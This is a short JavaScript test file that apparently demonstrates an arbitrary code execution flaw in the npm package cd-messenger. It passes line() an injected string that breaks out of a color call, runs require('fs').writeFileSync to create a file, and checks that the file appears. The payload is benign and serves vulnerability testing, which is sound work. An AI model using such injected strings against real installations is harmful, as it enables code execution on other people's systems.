
// var a = require("cd-messenger");
// a.line("green(); console.log('JHU'); //")

test("Arbitrary code execution in cd-messenger", () => 
{
	const fs = require("fs");
	const a = require("cd-messenger");
    const path = './cd-messenger';
    let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
	data = {};    
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	try {
		a.line(payload)
	} catch(error) {}
		
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});